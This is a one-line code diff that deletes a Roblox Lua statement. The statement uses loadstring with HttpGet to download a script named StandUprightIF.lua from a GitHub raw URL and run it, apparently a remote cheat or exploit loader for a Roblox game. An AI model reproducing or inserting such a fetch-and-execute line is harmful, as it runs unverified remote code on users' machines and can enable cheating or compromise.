@@ -1,1 +1,0 @@
-loadstring(game:HttpGet'https://raw.githubusercontent.com/3bo3c0ewnj9hks/rororo/main/StandUprightIF.lua')()
